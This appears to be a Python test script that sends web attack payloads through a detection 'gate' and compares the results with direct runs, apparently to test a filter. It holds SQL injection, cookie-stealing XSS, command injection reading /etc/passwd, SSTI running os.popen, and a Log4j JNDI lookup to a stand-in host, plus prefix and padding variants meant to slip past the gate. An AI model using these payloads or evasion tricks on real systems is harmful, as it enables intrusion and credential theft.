import sys; sys.path.insert(0, sys.argv[1])
from harness import *
from urllib.parse import quote
def enc(s): return quote(s, safe="")
cases = {
 "sqli q plain": "/search?q=" + enc("x' UNION SELECT username,password FROM users--"),
 "sqli q prefix token:": "/search?q=" + enc("token:x' UNION SELECT username,password FROM users--"),
 "xss q plain": "/search?q=" + enc("<script>alert(document.cookie)</script>"),
 "xss q prefix pass=": "/search?q=" + enc("pass=<script>alert(document.cookie)</script>"),
 "cmdi plain": "/ping?host=" + enc("127.0.0.1;cat /etc/passwd"),
 "cmdi prefix auth:": "/ping?host=" + enc("auth:127.0.0.1;cat /etc/passwd"),
 "ssti prefix secret:": "/hello?name=" + enc("secret:{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
 "log4j prefix pwd=": "/hello?name=" + enc("pwd=${jndi:ldap://x.example/a}"),
 "param named token": "/api/reset?token=" + enc("' OR 1=1--"),
 "sqli pad 2100": "/search?pad=" + "A"*2100 + "&q=" + enc("x' UNION SELECT username,password FROM users--"),
}
for name, t in cases.items():
    d = run([direct_event(t)])[0]; g_ev = gate_event(t); g = run([g_ev])[0]
    print(f"{name:24s} direct={web(d)} gate={web(g)} gate_query_tail={g_ev.http.query[-60:]!r}")
# JSON body
for name, body in {"json plain": '{"q":"x\'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--"}',
                   "json prefix auth:": '{"q":"auth:\'/**/UNION/**/SELECT/**/username%2Cpassword/**/FROM/**/users--"}',
                   "json prefix auth: nocomma": '{"q":"auth:\'/**/UNION/**/SELECT/**/1/**/FROM/**/users--"}',
                   "form prefix": "q=" + enc("token:x' UNION SELECT username,password FROM users--")}.items():
    ct = "application/json" if body.startswith("{") else "application/x-www-form-urlencoded"
    d = run([direct_event("/api/search", method="POST", body=body, ct=ct)])[0]
    g_ev = gate_event("/api/search", method="POST", body=body, ct=ct); g = run([g_ev])[0]
    print(f"{name:24s} direct={web(d)} gate={web(g)} body={g_ev.http.request_body[:90]!r}")
